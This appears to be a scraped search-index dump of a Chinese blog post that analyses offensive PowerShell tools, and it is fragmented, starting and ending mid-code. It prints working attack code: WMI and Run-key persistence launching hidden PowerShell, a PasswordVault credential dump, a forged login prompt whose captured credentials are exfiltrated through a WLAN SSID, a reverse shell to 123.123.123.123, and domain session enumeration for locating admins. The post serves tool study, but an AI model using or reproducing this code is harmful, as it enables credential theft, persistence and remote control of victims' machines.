$exfiltration -Append $env:TEMP\\$modulename Out-File -InputObject $options -Append $env:TEMP\\$modulename echo \"Set objShell = CreateObject(`\"Wscript.shell`\")\" > $env:TEMP\\$name echo \"objShell.run(`\"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\\$modulename`\")\" >> $env:TEMP\\$name $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true) { $scriptpath = $env:TEMP $scriptFileName = \"$scriptpath\\$name\" $filterNS = \"root\\cimv2\" $wmiNS = \"root\\subscription\" $query = @\" Select * from __InstanceCreationEvent within 30 where targetInstance isa 'Win32_LogonSession' \"@ $filterName = \"WindowsSanity\" $filterPath = Set-WmiInstance -Class __EventFilter -Namespace $wmiNS -Arguments @{name=$filterName; EventNameSpace=$filterNS; QueryLanguage=\"WQL\"; Query=$query} $consumerPath = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace $wmiNS -Arguments @{name=\"WindowsSanity\"; ScriptFileName=$scriptFileName; ScriptingEngine=\"VBScript\"} Set-WmiInstance -Class __FilterToConsumerBinding -Namespace $wmiNS -arguments @{Filter=$filterPath; Consumer=$consumerPath} | out-null } else { New-ItemProperty -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name Update -PropertyType String -Value $env:TEMP\\$name -force echo \"Set objShell = CreateObject(`\"Wscript.shell`\")\" > $env:TEMP\\$name echo \"objShell.run(`\"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\\$modulename`\")\" >> $env:TEMP\\$name } } \u600e\u4e48\u4f18\u5316 IO\u52a0\u5bc6 Gather Get-WebCredentials \u6b64\u811a\u672c\u7528\u4e8e\u6536\u96c6\u7f51\u7ad9\u7528\u6237\u5bc6\u7801\uff0c\u5f88\u77ed\uff0c\u4f46\u662f\u5176\u6536\u96c6\u5bc6\u7801\u7684\u65b9\u5f0f\u4f5c\u4e3a\u83dc\u9e21\u7684\u6211\u8fd8\u662f\u7b2c\u4e00\u6b21\u89c1\u3002 \u53c2\u6570 \u6ca1\u6709\u53c2\u6570 \u5177\u4f53\u903b\u8f91 Windows.Security.Credentials.PasswordVault \u662f\u4e00\u4e2a\u8bb0\u5f55\u5e94\u7528\u548c\u670d\u52a1\u51ed\u8bc1\u7684class\u3002 \u6211\u4eec\u53ea\u9700\u8981\u5bf9\u5176\u8fdb\u884c\u7b80\u5355\u7684\u904d\u5386\u8f93\u51fa\uff0c\u4fbf\u53ef\u4ee5\u5f97\u5230\u4e00\u4e9b\u51ed\u8bc1\u3002 $ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime] //\u8fd9\u4e00\u6bb5\u53ef\u4ee5\u4e0d\u8981 $VaultObj = new-object Windows.Security.Credentials.PasswordVault $VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ } Invoke-SSIDEXfil \u8fd9\u4e2a\u811a\u672c\u8fd0\u884c\u540e\u4f1a\u5f39\u51fa\u4e00\u4e2a\u767b\u5f55\u6846\u8981\u6c42\u7528\u6237\u8f93\u5165\u6b63\u786e\u7684\u5bc6\u7801\u8d26\u6237\uff0c\u82e5\u4e0d\u6b63\u786e\u8fd8\u4f1a\u4e00\u76f4\u5f39\u6846\u3002\u6700\u540e\u628a\u6b63\u786e\u7684\u5bc6\u7801\u8d26\u6237\u901a\u8fc7SSID\u5916\u5e26\u51fa\u6765\u3002 \u8fd9\u91cc\u6211\u5bf9\u5b83\u600e\u4e48\u5916\u5e26\u6570\u636e\u4e0d\u592a\u611f\u5174\u8da3\uff0c\u6211\u66f4\u611f\u5174\u8da3\u7684\u662f\u90a3\u4e2a\u5f39\u767b\u5f55\u6846\u4ee5\u53ca\u9a8c\u8bc1\u51ed\u8bc1\u7684\u64cd\u4f5c\u3002 \u4f53\u903b\u8f91\uff08\u767b\u5f55\u6846\uff09 \u5173\u4e8e\u767b\u5f55\u6846\u5bf9\u51ed\u636e\u7684\u9a8c\u8bc1\u662f\u8fd9\u4e48\u4e2a\u903b\u8f91\uff1a 1.\u82e5\u662f\u975e\u57df\u7528\u6237\uff0c\u5219\u521b\u5efa\u4e00\u4e2a\u57fa\u4e8e\u8ba1\u7b97\u673a\u7684\u7528\u6237\u4e3b\u4f53\uff08\u5c01\u88c5\u4e86\u5e10\u6237\u6570\u636e\u548c\u64cd\u4f5c\u5171\u540c\u6240\u6709\u5b89\u5168\u4e3b\u4f53\u3002\u8fd9\u662f\u6240\u6709\u5b89\u5168\u4e3b\u4f53\u7684\u62bd\u8c61\u57fa\u7c7b\uff09\uff0c\u5e76\u5411\u7528\u6237\u4e3b\u4f53\u4f20\u5165\u51ed\u8bc1\u8fdb\u884c\u9a8c\u8bc1 2.\u82e5\u662f\u57df\u7528\u6237\uff0c\u5219\u901a\u8fc7\u4f20\u5165\u7684\u57df\uff0c\u7528\u6237\u540d\uff0c\u5bc6\u7801\u6765\u5b9e\u4f8b\u5316\u4e00\u4e2a DirectoryEntry \u6765\u8fbe\u5230\u9a8c\u8bc1\u51ed\u8bc1\u6b63\u786e\u6027\u7684\u76ee\u7684 Add-Type -assemblyname system.DirectoryServices.accountmanagement $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine) $domainDN = \"LDAP://\" + ([ADSI]\"\").distinguishedName ..... while($true) { #Displaying a forged login prompt to the user. $credential = $host.ui.PromptForCredential(\"Credentials are required to perform this operation\", \"Please enter your user name and password.\", \"\", \"\") //\u8fd9\u53e5\u8d1f\u8d23\u8bbe\u7f6e\u767b\u9646\u6846\u63d0\u793a\u4fe1\u606f\u548c\u6807\u9898 if($credential) { $creds = $credential.GetNetworkCredential() [String]$user = $creds.username [String]$pass = $creds.password [String]$domain = $creds.domain #Check for validity of credentials locally and with domain. $authlocal = $DS.ValidateCredentials($user, $pass) $authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass) if(($authlocal -eq $true) -or ($authdomain.name -ne $null)) { $output = $authdomain.name + \":\" + $user + \":\" + $pass $ssidname = ConvertTo-ROT13 -rot13string $output Write-Verbose \"Setting the hosted network SSID to $ssidname in the form Domain:Username:Password.\" netsh wlan set hostednetwork mode=allow ssid=`\"$ssidname`\" key='HardtoGuess!@#123' Write-Verbose \"Startig the hosted network SSID $ssidname.\" netsh wlan start hostednetwork break } } } powerview Get-NetSession \u4ece\u4e00\u53f0\u673a\u5668\u4e0a\u83b7\u53d6\u7528\u6237\u767b\u5f55\u4fe1\u606f \u53c2\u6570 \u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6307\u5b9a\u673a\u5668\u7684IP\u6216\u673a\u5668\u540d \u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2apowershell\u4e0b\u7684\u7528\u6237\u51ed\u8bc1\u4fe1\u606f\u7c7b\uff0c\u53ef\u4ee5\u8be6\u89c1\u8fd9\u91cc https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions?view=powershell-7.1 , Param( [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)] [Alias('HostName', 'dnshostname', 'name')] [ValidateNotNullOrEmpty()] [String[]] $ComputerName = 'localhost', [Management.Automation.PSCredential] [Management.Automation.CredentialAttribute()] $Credential = [Management.Automation.PSCredential]::Empty ) \u5177\u4f53\u903b\u8f91 BEGIN { if ($PSBoundParameters['Credential']) { $LogonToken = Invoke-UserImpersonation -Credential $Credential } } \u4e00\u5f00\u59cb\u4f1a\u901a\u8fc7\u8bbe\u7f6e\u7684Credential\u53c2\u6570\u6765\u6a21\u62df\u4ee4\u724c ForEach ($Computer in $ComputerName) { # arguments for NetSessionEnum $QueryLevel = 10 $PtrInfo = [IntPtr]::Zero $EntriesRead = 0 $TotalRead = 0 $ResumeHandle = 0 # get session information $Result = $Netapi32::NetSessionEnum($Computer, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle) # locate the offset of the initial intPtr $Offset = $PtrInfo.ToInt64() \u7136\u540e\u4f1a\u5faa\u73af\u904d\u5386computername\u4e2d\u7684\u673a\u5668\u540d\uff0c\u5206\u522b\u8c03\u7528Netapi32::NetSessionEnum\u65b9\u6cd5\u6765\u83b7\u53d6session\u4fe1\u606f \u8fd9\u4e2aAPI\u7684\u76f8\u5173\u5b9a\u4e49\u5982\u4e0b\uff08\u5fae\u8f6f\u5b98\u65b9\u6587\u6863\u5df2\u7ecf\u5220\u9664\u4e86\u8fd9\u4e2aAPI\u7684\u5b9a\u4e49\uff09 servername : \u8be5\u5b57\u7b26\u4e32\u6307\u5b9a\u8981\u5728\u5176\u4e0a\u6267\u884c\u51fd\u6570\u7684\u8fdc\u7a0b\u670d\u52a1\u5668\u7684DNS\u6216NetBIOS\u540d\u79f0\u3002\u5982\u679c\u6b64\u53c2\u6570\u4e3a NULL \uff0c\u5219\u4f7f\u7528\u672c\u5730\u8ba1\u7b97\u673a\u3002 UncClientName\uff1a \u8be5\u5b57\u7b26\u4e32\u6307\u5b9a\u8981\u4e3a\u5176\u8fd4\u56de\u4fe1\u606f\u7684\u8ba1\u7b97\u673a\u4f1a\u8bdd\u7684\u540d\u79f0\u3002\u5982\u679c\u6b64\u53c2\u6570\u4e3a NULL \uff0c\u5219 NetSessionEnum \u5c06\u8fd4\u56de\u670d\u52a1\u5668\u4e0a\u6240\u6709\u8ba1\u7b97\u673a\u4f1a\u8bdd\u7684\u4fe1\u606f\u3002 username: \u8be5\u5b57\u7b26\u4e32\u6307\u5b9a\u8981\u4e3a\u5176\u8fd4\u56de\u4fe1\u606f\u7684\u7528\u6237\u7684\u540d\u79f0\u3002\u5982\u679c\u6b64\u53c2\u6570\u4e3a NULL \uff0c\u5219 NetSessionEnum \u5c06\u8fd4\u56de\u6240\u6709\u7528\u6237\u7684\u4fe1\u606f\u3002 level\uff1a \u6307\u5b9a\u6570\u636e\u7684\u4fe1\u606f\u7ea7\u522b\u3002 bufptr\uff1a \u6307\u5411\u63a5\u6536\u6570\u636e\u7684\u7f13\u51b2\u533a\u7684\u6307\u9488\u3002\u6b64\u6570\u636e\u7684\u683c\u5f0f\u53d6\u51b3\u4e8e level \u53c2\u6570\u7684\u503c\u3002\u6b64\u7f13\u51b2\u533a\u7531\u7cfb\u7edf\u5206\u914d\uff0c\u5fc5\u987b\u4f7f\u7528 NetApiBufferFree \u51fd\u6570\u91ca\u653e \u3002\u8bf7\u6ce8\u610f\uff0c\u5373\u4f7f\u51fd\u6570\u56e0 ERROR_MORE_DATA \u800c\u5931\u8d25\uff0c\u4e5f\u5fc5\u987b\u91ca\u653e\u7f13\u51b2\u533a\u3002 prefmaxlen: \u7f13\u51b2\u533a\u5927\u5c0f \u5b83\u4e0d\u5141\u8bb8\u76f4\u63a5\u67e5\u8be2\u662f\u8c01\u767b\u9646\u4e86\u6b64\u5de5\u4f5c\u7ad9\uff0c\u4f46\u662f\u5b83\u5141\u8bb8\u67e5\u8be2\u662f\u8c01\u5728\u8bbf\u95ee\u6b64\u5de5\u4f5c\u7ad9\u7684\u7f51\u7edc\u8d44\u6e90\uff08\u4f8b\u5982\u6587\u4ef6\u5171\u4eab\uff09\u65f6\u6240\u521b\u5efa\u7684\u7f51\u7edc\u4f1a\u8bdd\uff0c\u4ece\u800c\u77e5\u9053\u6765\u81ea\u4f55\u5904\u3002\u5f53\u7136\u8fd9\u91cc\u6700\u597d\u7684\u67e5\u8be2\u5bf9\u8c61\u662f\u57df\u63a7 + \u6587\u4ef6\u5171\u4eab\u670d\u52a1\u5668\u3002\u6b64\u51fd\u6570\u4e0d\u9700\u8981\u9ad8\u6743\u9650\u3002 \u8fd9\u90e8\u5206\u7684\u5927\u81f4\u610f\u601d\u4fbf\u662f\u5faa\u73af\u8bfb\u53d6\u7f13\u51b2\u533a\u91cc\u7684\u5185\u5bb9\uff0c\u5e76\u5c06\u5185\u5bb9\u683c\u5f0f\u5316\u540e\u8f93\u51fa ```\u7eaf\u6587\u672c # 0 = success if (($Result -eq 0) -and ($Offset -gt 0)) { # work out how much to increment the pointer by finding out the size of the structure $Increment = $SESSION_INFO_10::GetSize() # parse all the result structures for ($i = 0; ($i -lt $EntriesRead); $i++) { # create a new int ptr at the given offset and cast the pointer as our result structure $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset $Info = $NewIntPtr -as $SESSION_INFO_10 //-as \u5c06\u6307\u9488\u8f6c\u5316\u4e3a\u6307\u5b9a\u7c7b\u578b\uff08SESSION_INFO_10\u7ed3\u6784\u4f53\uff09 # return all the sections of the structure - have to do it this way for V2 $Session = $Info | Select-Object * $Session | Add-Member Noteproperty 'ComputerName' $Computer $Session.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo') $Offset = $NewIntPtr.ToInt64() $Offset += $Increment $Session } # free up the result buffer $Null = $Netapi32::NetApiBufferFree($PtrInfo) } else { Write-Verbose \"[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message)\" } ``` Get-NetLoggedon \u548cGet-NetSession\u5dee\u4e0d\u591a\uff0c\u4e5f\u662f\u7528\u4e8e\u67e5\u8be2\u67d0\u673a\u5668\u4e0a\u7684\u767b\u5f55\u4f1a\u8bdd\uff0c\u4f46\u662fGet-NetSession\u662f\u4ee5NetSessionEnum Api\u4e3a\u6838\u5fc3\uff0cGet-NetLoggedon\u662f\u4ee5NetWkstaUserEnum Api\u4e3a\u6838\u5fc3 \u5177\u4f53\u903b\u8f91 \u903b\u8f91\u548cGet-NetSession\u5dee\u4e0d\u591a\uff0c\u8fd9\u91cc\u5c31\u7740\u91cd\u4ecb\u7ecd\u4e00\u4e0bNetWkstaUserEnum \u8fd9\u4e2aAPI \u8be5 NetWkstaUserEnum \u529f\u80fd\u53ef\u4ee5\u5217\u51fa\u5f53\u524d\u767b\u5f55\u5230\u8be5\u5de5\u4f5c\u7ad9\u7684\u6240\u6709\u7528\u6237\u7684\u4fe1\u606f\u3002\u6b64\u5217\u8868\u5305\u62ec\u4ea4\u4e92\u5f0f\u3001\u670d\u52a1\u548c\u6279\u91cf\u767b\u5f55\u3002\u6b64\u51fd\u6570\u9700\u8981\u4e3b\u673a\u7684\u7ba1\u7406\u6743\u9650\u6216\u8fd9\u57df\u7ba1\u6743\u9650\uff0c\u9002\u7528\u4e8e\u81ea\u68c0\u4f7f\u7528\u3002 servername\uff1a \u8be5\u5b57\u7b26\u4e32\u6307\u5b9a\u8981\u5728\u5176\u4e0a\u6267\u884c\u51fd\u6570\u7684\u8fdc\u7a0b\u670d\u52a1\u5668\u7684DNS\u6216NetBIOS\u540d\u79f0\u3002\u5982\u679c\u6b64\u53c2\u6570\u4e3a NULL \uff0c\u5219\u4f7f\u7528\u672c\u5730\u8ba1\u7b97\u673a\u3002 level\uff1a \u6307\u5b9a\u6570\u636e\u7684\u4fe1\u606f\u7ea7\u522b\u3002 bufptr\uff1a \u6307\u5411\u63a5\u6536\u6570\u636e\u7684\u7f13\u51b2\u533a\u7684\u6307\u9488\u3002\u6b64\u6570\u636e\u7684\u683c\u5f0f\u53d6\u51b3\u4e8e level \u53c2\u6570\u7684\u503c\u3002\u6b64\u7f13\u51b2\u533a\u7531\u7cfb\u7edf\u5206\u914d\uff0c\u5fc5\u987b\u4f7f\u7528 NetApiBufferFree \u51fd\u6570\u91ca\u653e \u3002\u8bf7\u6ce8\u610f\uff0c\u5373\u4f7f\u51fd\u6570\u56e0 ERROR_MORE_DATA \u800c\u5931\u8d25\uff0c\u4e5f\u5fc5\u987b\u91ca\u653e\u7f13\u51b2\u533a\u3002 Find-DomainUserLocation Find-DomainUserLocation\u662f\u4e00\u4e2a\u7528\u4e8e\u5b9a\u4f4d\u7528\u6237\u5728\u54ea\u53f0\u673a\u5668\u4e0a\u767b\u5f55\u7684\u811a\u672c \u8fd9\u4e2a\u811a\u672c\u5176\u5b9e\u5c31\u662f\u4e2a\u7f1d\u5408\u602a\uff0c\u5b83\u7684\u903b\u8f91\u5982\u4e0b \u5177\u4f53\u903b\u8f91 \u8fd9\u662f\u5b83\u81ea\u5df1\u7684\u89e3\u91ca This function enumerates all machines on the current (or specified) domain using Get-DomainComputer, and queries the domain for users of a specified group (default 'Domain Admins') with Get-DomainGroupMember. Then for each server the function enumerates any active user sessions with Get-NetSession/Get-NetLoggedon The found user list is compared against the target list, and any matches are displayed. If -ShowAll is specified, all results are displayed instead of the filtered set. If -Stealth is specified, then likely highly-trafficed servers are enumerated with Get-DomainFileServer/Get-DomainController, and session enumeration is executed only against those servers. If -Credential is passed, then Invoke-UserImpersonation is used to impersonate the specified user before enumeration, reverting after with Invoke-RevertToSelf. \u5148\u8c03\u7528Get-DomainComputer\u83b7\u53d6\u57df\u4e2d\u8ba1\u7b97\u673a\u540d\uff0c\u7136\u540e\u901a\u8fc7Get-DomainUser,Get-DomainGroupMember \u6765\u83b7\u53d6\u57df\u4e2d\u7528\u6237\u4fe1\u606f\uff0c\u7136\u540e\u901a\u8fc7Get-NetSession/Get-NetLoggedon\u6765\u67e5\u8be2\u5404\u8ba1\u7b97\u673a\u4e2d\u7684\u767b\u5f55\u4f1a\u8bdd\u4fe1\u606f\u3002","title":"powershell\u811a\u672c\u7684\u5206\u6790"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/#powershell","text":"","title":"powershell\u811a\u672c\u7684\u5206\u6790"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/#_1","text":"\u7b51\u57fa CmdletBinding \u53c2\u6570\u96c6 nishang Shells Invoke-powershelltcp Invoke-PoshRatHttp backdoor Http-Backdoor Gather Get-WebCredentials powerview Get-NetSession \u53c2\u6570 \u5177\u4f53\u903b\u8f91 Get-NetLoggedon \u5177\u4f53\u903b\u8f91 Find-DomainUserLocation \u5177\u4f53\u903b\u8f91","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/#_2","text":"","title":"\u7b51\u57fa"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/#cmdletbinding","text":"CmdletBinding \u5f80\u5f80\u51fa\u73b0\u5728ps\u4e2d\u4e00\u4e2a\u51fd\u6570\u7684\u5f00\u5934\uff0c\u7528\u4e8e\u53c2\u6570\u5904\u7406\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u4e00\u4e2aps\u51fd\u6570\u662f\u8fd9\u6837\u6765\u8bbe\u7f6e\u53c2\u6570\u7684\u3002\uff08\u5f53\u7136\u4e5f\u53ef\u4ee5\u7528\u6700\u6734\u5b9e\u7684 function foo($a,$b,\\$c) \u6765\u5b9e\u73b0\u53c2\u6570\uff09 function Get-Version{ param ( $ComputerName ) Write-Output $ComputerName } \u610f\u601d\u5c31\u662f\u63a5\u6536ComputerName\u53c2\u6570\uff0c\u8f93\u51faComputerName\u53c2\u6570\u3002 Get-Version -ComputerName aa >aa \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7Get-Command\u6307\u4ee4\u6765\u770b\u6b64\u51fd\u6570\u652f\u6301\u54ea\u4e9b\u53c2\u6570\u3002 PS C:\\Users\\14216\\Desktop> (Get-Command -name Get-Version).Parameters.Keys ComputerName \u53d1\u73b0\u5b83\u53ea\u652f\u6301ComputerName\u53c2\u6570\uff0c\u56e0\u4e3a\u6211\u4eec\u5728param\u4e2d\u53ea\u8bbe\u7f6e\u4e86ComputerName\u53c2\u6570\u3002 \u4f46\u662fpowershell\u4e2d\u662f\u5b58\u5728\u6709\u8bb8\u591a\u901a\u7528\u53c2\u6570(CommonParameters)\u7684\u3002 \u901a\u7528\u53c2\u6570\u5982 -verbose(\u663e\u793a\u547d\u4ee4\u6240\u6267\u884c\u64cd\u4f5c\u7684\u8be6\u7ec6\u4fe1\u606f)\uff0c-debug(\u663e\u793a\u6709\u5173\u547d\u4ee4\u5b8c\u6210\u7684\u64cd\u4f5c\u7684\u7a0b\u5e8f\u5458\u7ea7\u8be6\u7ec6\u4fe1\u606f)\u7b49\u3002 \u50cf\u4e0a\u9762\u90a3\u6837\u5b9a\u4e49\u51fd\u6570\u53c2\u6570\uff0c\u662f\u4e0d\u80fd\u8ba9\u51fd\u6570\u63a5\u6536\u901a\u7528\u53c2\u6570\u7684\uff0c\u60f3\u8981\u63a5\u6536\u901a\u7528\u53c2\u6570\uff0c\u53ea\u9700\u5728param\u524d\u52a0\u4e0a [CmdletBinding()]\u5373\u53ef\uff0c\u5982\u4e0b function Get-Version{ [CmdletBinding()] param ( $ComputerName ) Write-Output $ComputerName } \u6b64\u65f6\u8be5\u51fd\u6570\u5c31\u53d8\u6210\u4e86\u201c\u9ad8\u7ea7\u51fd\u6570\u201d\uff0c\u6211\u4eec\u518d\u901a\u8fc7Get-Command\u53c2\u6570\u5373\u53ef\u770b\u51fa\u5b83\u652f\u6301\u4e86\u901a\u7528\u53c2\u6570 PS C:\\Users\\14216\\Desktop> (Get-Command -name Get-Version).Parameters.Keys ComputerName Verbose Debug ErrorAction WarningAction InformationAction ErrorVariable WarningVariable InformationVariable OutVariable OutBuffer PipelineVariable","title":"CmdletBinding"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/#_3","text":"\u901a\u8fc7\u4e3a\u51fd\u6570\u8bbe\u7f6e\u53c2\u6570\u96c6\uff0c\u53ef\u4ee5\u4f7f\u51fd\u6570\u5728\u4e0d\u540c\u573a\u666f\u4e0b\u6267\u884c\u4e0d\u540c\u7684\u64cd\u4f5c\u3002 \u8981\u521b\u5efa\u53c2\u6570\u96c6\uff0c\u60a8\u5fc5\u987b\u4e3a\u53c2\u6570\u96c6\u4e2d\u7684\u6bcf\u4e2a\u53c2\u6570\u6307\u5b9a Parameter \u5c5e\u6027\u7684 ParameterSetName \u5173\u952e\u5b57\u3002\u5bf9\u4e8e\u5c5e\u4e8e\u591a\u4e2a\u53c2\u6570\u96c6\u7684 \u53c2\u6570\uff0c \u4e3a\u6bcf\u4e2a\u53c2\u6570\u96c6\u6dfb\u52a0\u4e00\u4e2a Parameter \u5c5e\u6027\u3002\u6ca1\u6709\u6307\u5b9a\u53c2\u6570\u96c6\u540d\u79f0\u7684\u53c2\u6570\u5c5e\u4e8e\u6240\u6709\u53c2\u6570\u96c6\u3002 \u8fd9\u91cc\u9009\u53d6\u5fae\u8f6f\u5b98\u65b9\u7ed9\u51fa\u7684\u4f8b\u5b50. DefaultParameterSetName \u6307\u5b9a\u9ed8\u8ba4\u91c7\u7528\u7684\u53c2\u6570\u96c6 Mandatory \u6307\u5b9a\u8fd9\u4e2a\u53c2\u6570\u5728\u6b64\u53c2\u6570\u96c6\u4e2d\u662f\u5426\u4e3a\u5f3a\u5236\u7684 ParameterSetName \u6307\u5b9a\u53c2\u6570\u6240\u5c5e\u53c2\u6570\u96c6 [CmdletBinding(DefaultParameterSetName = 'Path')] param ( [Parameter(Mandatory = $true, ParameterSetName = 'Path', HelpMessage = 'Enter one or more filenames', Position = 0)] [Parameter(Mandatory = $true, ParameterSetName = 'PathAll', Position = 0)] [string[]]$Path, [Parameter(Mandatory = $true, ParameterSetName = 'LiteralPathAll')] [Parameter(Mandatory = $true, ParameterSetName = 'LiteralPath', HelpMessage = 'Enter a single filename', ValueFromPipeline = $true)] [string]$LiteralPath, [Parameter(ParameterSetName = 'Path')] [Parameter(ParameterSetName = 'LiteralPath')] [switch]$Lines, [Parameter(ParameterSetName = 'Path')] [Parameter(ParameterSetName = 'LiteralPath')] [switch]$Words, [Parameter(ParameterSetName = 'Path')] [Parameter(ParameterSetName = 'LiteralPath')] [switch]$Characters, [Parameter(Mandatory = $true, ParameterSetName = 'PathAll')] [Parameter(Mandatory = $true, ParameterSetName = 'LiteralPathAll')] [switch]$All, [Parameter(ParameterSetName = 'Path')] [Parameter(ParameterSetName = 'PathAll')] [switch]$Recurse )","title":"\u53c2\u6570\u96c6"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/#nishang","text":"","title":"nishang"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/#shells","text":"Shells\u6a21\u5757\u4e3b\u8981\u662f\u7528\u6765\u5f39shell\u7684\u3002","title":"Shells"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/#invoke-powershelltcp","text":"\u8fd9\u4e2afunction\u7684\u4f5c\u7528\u662f\uff0c\u901a\u8fc7tcp\u8fdb\u884c\u8fdeshell\u64cd\u4f5c\u3002 \u6b63\u8fdeshell Invoke-powershelltcp -bind -port 10086 \u53cd\u5f39shell Invoke-powershelltcp -reverse -ipaddress 123.123.123.123 -port 10086 ** \u53c2\u6570 ** [CmdletBinding(DefaultParameterSetName=\"reverse\")] Param( [Parameter(Position = 0, Mandatory = $true, ParameterSetName=\"reverse\")] [Parameter(Position = 0, Mandatory = $false, ParameterSetName=\"bind\")] [String] $IPAddress, [Parameter(Position = 1, Mandatory = $true, ParameterSetName=\"reverse\")] [Parameter(Position = 1, Mandatory = $true, ParameterSetName=\"bind\")] [Int] $Port, [Parameter(ParameterSetName=\"reverse\")] [Switch] $Reverse, [Parameter(ParameterSetName=\"bind\")] [Switch] $Bind ) \u53ef\u4ee5\u5f88\u8f7b\u677e\u53d1\u73b0\u6709\u4e24\u4e2a\u53c2\u6570\u96c6\u5206\u522b\u5bf9\u5e94\u76d1\u542c\u53cd\u5f39shell\u548c\u76f4\u63a5\u53cd\u5f39shell\u3002 \u5177\u4f53\u903b\u8f91 \u5728\u4ee3\u7801\u903b\u8f91\u5f00\u7aef\uff0c\u5148\u901a\u8fc7\u53c2\u6570\u5224\u65ad\u81ea\u8eab\u884c\u4e3a\u662f\u53cd\u5f39\u8fd8\u662f\u76d1\u542c\u3002 \u5982\u679c\u662f\u53cd\u5f39shell\uff0c\u5219\u4e0e\u6307\u5b9aIP\u7aef\u53e3\u8fdb\u884c\u94fe\u63a5\u3002System.Net.Sockets.TCPClient\uff1a https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient?view=net-5.0 \u5982\u679c\u662f\u6b63\u8fdeshell\uff0c\u5219\u4e8e\u6307\u5b9a\u7aef\u53e3\u5f00\u542f\u76d1\u542c\u5e76\u7b49\u5f85\u94fe\u63a5\u3002System.Net.Sockets.TcpListenerhttps\\://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcplistener?view=net-5.0 if ($Reverse) { $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port) } #Bind to the provided port if Bind switch is used. if ($Bind) { $listener = [System.Net.Sockets.TcpListener]$Port $listener.start() $client = $listener.AcceptTcpClient() } \u5728\u83b7\u53d6\u8fde\u63a5\u540e\uff0c\u83b7\u53d6TcpClient\u7684stream\u6d41\u7528\u4e8e\u8bfb\u5199\u6570\u636e\u3002\u7136\u540e\u901a\u8fc7stream\u6d41\u53d1\u9001\u8d77\u59cb\u7684\u4fe1\u606f\u3002 $stream = $client.GetStream() [byte[]]$bytes = 0..65535|%{0} //\u83b7\u53d6\u4e00\u4e2a\u957f\u5ea6\u4e3a65535\u88ab0\u586b\u5145\u7684\u5b57\u8282\u6570\u636e\uff0c\u7528\u4e8e\u540e\u6765\u7684TCP\u6570\u636e\u4ea4\u6362 #Send back current username and computername $sendbytes = ([text.encoding]::ASCII).GetBytes(\"Windows PowerShell running as user \" + $env:username + \" on \" + $env:computername + \"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n\") $stream.Write($sendbytes,0,$sendbytes.Length) #Show an interactive PowerShell prompt $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + 